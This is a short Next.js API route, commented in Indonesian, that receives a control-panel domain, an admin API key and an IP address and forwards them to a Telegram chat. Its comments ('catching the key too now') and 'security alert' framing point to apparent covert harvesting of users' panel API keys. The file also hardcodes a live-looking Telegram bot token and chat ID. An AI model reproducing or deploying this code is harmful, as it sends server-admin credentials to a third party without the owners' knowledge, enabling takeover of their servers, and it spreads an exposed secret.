// pages/api/notify.js
import axios from 'axios';

// Token & Chat ID lu (JANGAN SAMPAI LEPAS KE PUBLIC)
const BOT_TOKEN = '7326623466:AAFKdUTahzRetWMjhPli4L4v6RLFajm-8Uc';
const CHAT_ID = '6315300476';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { domain, key, ip } = req.body; // Nangkep key juga sekarang
  const date = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  // Pesan Telegram dengan Format Security Alert
  const message = `
🚨 <b>SECURITY ALERT: NEW CONFIG</b>

👤 <b>User IP: </b> <code>${ip || 'Hidden'}</code>
🌐 <b>Panel: </b> <code>${domain}</code>
🔑 <b>API Key (PLTA): </b>
<code>${key}</code>

📅 <b>Time:</b> ${date}
<i>⚠️ Pastikan API Key ini milik user yang sah.</i>
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram Error:", error.message);
    res.status(500).json({ success: false });
  }
}
